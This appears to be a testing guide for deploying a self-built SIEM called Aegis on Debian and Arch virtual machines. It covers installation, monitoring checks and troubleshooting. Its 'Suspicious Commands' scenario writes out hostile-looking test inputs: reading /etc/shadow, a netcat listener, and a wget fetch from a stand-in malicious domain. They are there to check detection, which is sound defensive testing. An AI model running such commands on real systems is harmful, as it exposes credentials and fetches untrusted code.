# Aegis SIEM - Deployment Testing Guide

## 🧪 VM Testing Plan

This guide will help you test the Aegis SIEM installation on virtual machines before production deployment.

---

## 📋 Testing Checklist

### Phase 1: Server Installation (Debian VM)

- [ ] Create Debian 11/12 VM (2GB RAM, 2 CPU, 20GB disk)
- [ ] Run server installer
- [ ] Verify all services start correctly
- [ ] Access dashboard via browser
- [ ] Create admin user
- [ ] Generate registration token

### Phase 2: Agent Installation (Arch VM)

- [ ] Create Arch Linux VM (1GB RAM, 1 CPU, 10GB disk)
- [ ] Run agent installer
- [ ] Verify agent registers with server
- [ ] Check data appears in dashboard
- [ ] Verify real-time monitoring

### Phase 3: Functionality Testing

- [ ] System metrics collection
- [ ] Log collection
- [ ] Command logging
- [ ] Process monitoring
- [ ] Alert generation
- [ ] ML anomaly detection

---

## 🖥️ VM Setup Instructions

### Server VM (Debian)

**Minimum Requirements:**

- OS: Debian 12 (Bookworm) or Ubuntu 22.04 LTS
- RAM: 2GB (4GB recommended)
- CPU: 2 cores
- Disk: 20GB
- Network: Bridged or NAT with port forwarding

**VM Creation:**

1. **Download Debian ISO**

   ```bash
   # Debian 12 Netinstall
   wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso
   ```

2. **Create VM** (VirtualBox example)

   ```bash
   VBoxManage createvm --name "Aegis-Server" --ostype "Debian_64" --register
   VBoxManage modifyvm "Aegis-Server" --memory 2048 --cpus 2 --nic1 bridged
   VBoxManage createhd --filename "Aegis-Server.vdi" --size 20480
   VBoxManage storagectl "Aegis-Server" --name "SATA" --add sata --controller IntelAHCI
   VBoxManage storageattach "Aegis-Server" --storagectl "SATA" --port 0 --device 0 --type hdd --medium "Aegis-Server.vdi"
   VBoxManage storageattach "Aegis-Server" --storagectl "SATA" --port 1 --device 0 --type dvddrive --medium debian-12.0.0-amd64-netinst.iso
   ```

3. **Install Debian**

   - Boot from ISO
   - Select "Install" (not graphical install)
   - Choose minimal installation (no desktop environment)
   - Enable SSH server during installation
   - Create user: `aegis` (or your preferred username)

4. **Post-Install Setup**

   ```bash
   # SSH into the VM
   ssh aegis@VM_IP

   # Update system
   sudo apt update && sudo apt upgrade -y

   # Install git
   sudo apt install -y git
   ```

### Agent VM (Arch Linux)

**Minimum Requirements:**

- OS: Arch Linux (latest)
- RAM: 1GB (2GB recommended)
- CPU: 1 core
- Disk: 10GB
- Network: Same network as server

**VM Creation:**

1. **Download Arch ISO**

   ```bash
   wget https://mirror.rackspace.com/archlinux/iso/latest/archlinux-x86_64.iso
   ```

2. **Create VM** (VirtualBox example)

   ```bash
   VBoxManage createvm --name "Aegis-Agent-Arch" --ostype "ArchLinux_64" --register
   VBoxManage modifyvm "Aegis-Agent-Arch" --memory 1024 --cpus 1 --nic1 bridged
   VBoxManage createhd --filename "Aegis-Agent-Arch.vdi" --size 10240
   VBoxManage storagectl "Aegis-Agent-Arch" --name "SATA" --add sata --controller IntelAHCI
   VBoxManage storageattach "Aegis-Agent-Arch" --storagectl "SATA" --port 0 --device 0 --type hdd --medium "Aegis-Agent-Arch.vdi"
   VBoxManage storageattach "Aegis-Agent-Arch" --storagectl "SATA" --port 1 --device 0 --type dvddrive --medium archlinux-x86_64.iso
   ```

3. **Install Arch Linux**

   ```bash
   # Boot into Arch ISO
   # Follow Arch installation guide or use archinstall script
   archinstall

   # Minimal installation:
   # - No desktop environment
   # - Enable SSH
   # - Create user
   ```

---

## 🚀 Installation Testing

### Step 1: Server Installation

1. **Clone Repository on Server VM**

   ```bash
   ssh aegis@SERVER_VM_IP
   git clone https://github.com/MokshitBindal/Aegis.git
   cd Aegis/installers/server-linux
   ```

2. **Review Installation Script**

   ```bash
   less install.sh
   # Verify it looks correct
   ```

3. **Run Installer**

   ```bash
   sudo bash install.sh
   ```

4. **Expected Prompts:**

   - Database Name: `aegis_siem` (default)
   - Database User: `aegis_user` (default)
   - Generate password: `Y`
   - Server API Port: `8000` (default)
   - Dashboard Port: `80` (default)
   - Domain: (leave empty for IP)
   - Confirm installation: `Y`

5. **Installation Should Take:** 5-10 minutes

6. **Verify Installation:**

   ```bash
   # Check services
   sudo systemctl status aegis-server
   sudo systemctl status nginx
   sudo systemctl status postgresql

   # All should show "active (running)"

   # View credentials
   sudo cat /etc/aegis-siem/credentials.txt

   # Test API
   curl http://localhost:8000/health
   # Should return: {"status":"healthy","service":"aegis-siem-server","version":"1.0.0"}
   ```

7. **Access Dashboard:**

   - Open browser on host machine
   - Navigate to: `http://SERVER_VM_IP`
   - Should see Aegis SIEM login page

8. **Create Admin User:**

   ```bash
   cd /opt/aegis-siem/server
   sudo -u aegis ./venv/bin/python scripts/generate_invitation.py
   # Copy the invitation code
   ```

9. **Register via Dashboard:**
   - Click "Register" on login page
   - Enter invitation code
   - Create admin credentials
   - Login

### Step 2: Agent Installation (Arch)

1. **Clone Repository on Agent VM**

   ```bash
   ssh user@AGENT_VM_IP
   git clone https://github.com/MokshitBindal/Aegis.git
   cd Aegis/installers/agent-linux-arch
   ```

2. **Generate Registration Token on Server:**

   - Login to dashboard
   - Go to Devices page
   - Click "Generate Token" or use CLI:

   ```bash
   # On server VM
   cd /opt/aegis-siem/server
   sudo -u aegis ./venv/bin/python scripts/generate_invitation.py
   ```

3. **Run Agent Installer:**

   ```bash
   sudo bash install.sh
   ```

4. **Provide Configuration:**

   - Server URL: `http://SERVER_VM_IP:8000`
   - Registration Token: (paste from step 2)

5. **Installation Should Take:** 2-3 minutes

6. **Verify Agent:**

   ```bash
   # Check service
   sudo systemctl status aegis-agent
   # Should show "active (running)"

   # View logs
   sudo journalctl -u aegis-agent -f
   # Should see connection success messages
   ```

7. **Verify on Dashboard:**
   - Go to Devices page
   - Should see new device listed
   - Status should be "Online"
   - Click device to see details

### Step 3: Data Collection Testing

1. **Generate Activity on Agent VM:**

   ```bash
   # Generate some commands
   ls -la /
   ps aux
   sudo dmesg | tail

   # Start some processes
   top &
   htop &

   # Generate some network activity
   curl https://google.com
   wget https://example.com
   ```

2. **Check Dashboard (Wait 1-2 minutes):**

   - **Metrics:** CPU, Memory, Disk, Network graphs should populate
   - **Logs:** System logs should appear
   - **Commands:** Recent commands should be listed
   - **Processes:** Running processes should be shown

3. **Test Alert Generation:**

   ```bash
   # On agent VM - stress test CPU
   yes > /dev/null &
   yes > /dev/null &
   yes > /dev/null &
   yes > /dev/null &

   # Wait 1-2 minutes
   # Kill processes
   killall yes
   ```

4. **Check Alerts:**
   - Go to Alerts page
   - Should see high CPU alert
   - May see ML anomaly detection alert

---

## ✅ Test Scenarios

### Scenario 1: Normal Operation

**Goal:** Verify baseline monitoring

1. Let system run for 10 minutes
2. Check all metrics are being collected
3. Verify no false-positive alerts
4. Check ML baseline is being established

**Expected Results:**

- Metrics updated every 60 seconds
- Logs streaming continuously
- No critical alerts for normal activity
- Agent status: Online

### Scenario 2: High Resource Usage

**Goal:** Test alert generation

1. On agent: `stress-ng --cpu 4 --timeout 120s`
2. Watch dashboard in real-time
3. Should see CPU spike in metrics
4. Should generate high CPU alert within 2-3 minutes

**Expected Results:**

- CPU graph shows spike
- Alert appears in alerts page
- Alert severity: Medium or High
- Alert details show process causing spike

### Scenario 3: Suspicious Commands

**Goal:** Test command logging and analysis

1. Run suspicious commands:

   ```bash
   sudo su -
   cat /etc/shadow
   nc -l 4444
   wget http://malicious-domain.com/script.sh
   ```

2. Check Command Log page
3. Some commands should trigger alerts

**Expected Results:**

- All commands logged with timestamp
- Privilege escalation detected
- Potentially malicious activity flagged

### Scenario 4: Network Activity

**Goal:** Test network monitoring

1. Generate network traffic:

   ```bash
   # Download large file
   wget https://speed.hetzner.de/100MB.bin

   # Upload
   scp 100MB.bin user@other-host:/tmp/
   ```

2. Check network metrics
3. Should see bandwidth spikes

**Expected Results:**

- Network graph shows traffic
- Download/upload rates tracked
- No alerts for legitimate traffic

### Scenario 5: ML Anomaly Detection

**Goal:** Test machine learning detection

1. Wait for baseline (10-15 minutes normal operation)
2. Perform anomalous activity:

   - Install unusual package
   - Access uncommon files
   - Run at unusual time
   - Spike resource usage

3. Check ML alerts (may take 10 minutes)

**Expected Results:**

- ML model establishes baseline
- Anomalous activity generates ML alert
- Alert shows anomaly score
- Contributing features identified

---

## 🐛 Troubleshooting Guide

### Server Issues

**Problem:** Installation fails at PostgreSQL setup

```bash
# Check PostgreSQL status
sudo systemctl status postgresql

# Check logs
sudo journalctl -u postgresql -n 50

# Try manual setup
sudo -u postgres psql
CREATE DATABASE aegis_siem;
```

**Problem:** Dashboard won't load (404)

```bash
# Check if files exist
ls -la /opt/aegis-siem/dashboard/dist/

# Rebuild dashboard
cd /opt/aegis-siem/dashboard
sudo -u aegis npm run build

# Restart Nginx
sudo systemctl restart nginx
```

**Problem:** Backend API returns 500 error

```bash
# Check logs
sudo journalctl -u aegis-server -n 100

# Check database connection
sudo -u aegis psql -h localhost -U aegis_user -d aegis_siem

# Restart service
sudo systemctl restart aegis-server
```

### Agent Issues

**Problem:** Agent won't register

```bash
# Check connectivity
curl -v http://SERVER_IP:8000/health

# Check token validity
# (Generate new token on server)

# Try manual registration
cd /opt/aegis-agent
export AEGIS_SERVER_URL="http://SERVER_IP:8000"
sudo -u aegis-agent ./venv/bin/python main.py register --token TOKEN
```

**Problem:** Agent crashes on startup

```bash
# Check logs
sudo journalctl -u aegis-agent -n 100

# Check Python dependencies
sudo -u aegis-agent /opt/aegis-agent/venv/bin/pip list

# Reinstall dependencies
cd /opt/aegis-agent
sudo -u aegis-agent ./venv/bin/pip install -r requirements.txt --force-reinstall
```

**Problem:** No data appearing in dashboard

```bash
# Check agent logs for errors
sudo tail -f /var/log/aegis-agent/agent.log

# Verify credentials file
sudo cat /opt/aegis-agent/agent.credentials

# Check network connectivity
ping SERVER_IP
curl http://SERVER_IP:8000/api/devices
```

---

## 📊 Success Criteria

Installation is successful if:

✅ **Server:**

- All services running (aegis-server, nginx, postgresql)
- Dashboard accessible via browser
- API health check returns 200 OK
- Can create admin user
- Database contains tables

✅ **Agent:**

- Service running without errors
- Successfully registered with server
- Appears in dashboard devices list
- Status shows "Online"
- Credentials file exists

✅ **Monitoring:**

- Metrics collected every 60 seconds
- Logs streaming to server
- Commands being logged
- Processes tracked
- Alerts generated appropriately

✅ **ML Detection:**

- Model initializes successfully
- Baseline established after 10-15 min
- Anomalies detected
- Alerts contain feature contributions

---

## 🎯 Next Steps After Testing

1. **Document Issues:** Note any problems encountered
2. **Performance Baseline:** Record resource usage
3. **Fix Bugs:** Address any installation issues
4. **Update Scripts:** Improve based on testing
5. **Create Demo Video:** Screen record successful installation
6. **Write Case Study:** Document testing process
7. **Production Deployment:** Deploy to real environment

---

## 📝 Testing Report Template

```markdown
# Aegis SIEM Testing Report

**Date:** YYYY-MM-DD
**Tester:** Your Name
**Environment:** VirtualBox / VMware / KVM

## Server Installation

- OS: Debian 12 / Ubuntu 22.04
- Installation Time: X minutes
- Issues: None / List issues
- Status: ✅ Success / ❌ Failed

## Agent Installation

- OS: Arch Linux
- Installation Time: X minutes
- Registration: ✅ Success / ❌ Failed
- Status: ✅ Online / ❌ Offline

## Functionality Tests

- [ ] Metrics Collection
- [ ] Log Streaming
- [ ] Command Logging
- [ ] Process Monitoring
- [ ] Alert Generation
- [ ] ML Detection

## Performance

- Server RAM Usage: XMB
- Server CPU Usage: X%
- Agent RAM Usage: XMB
- Agent CPU Usage: X%
- Network Bandwidth: X KB/s

## Issues Found

1. Issue description
2. Issue description

## Recommendations

1. Recommendation
2. Recommendation

## Overall Assessment

✅ Ready for production / ⚠️ Needs fixes / ❌ Major issues
```

---

**Ready to start testing? Begin with the server installation!**

```bash
# On Debian VM
git clone https://github.com/MokshitBindal/Aegis.git
cd Aegis/installers/server-linux
sudo bash install.sh
```
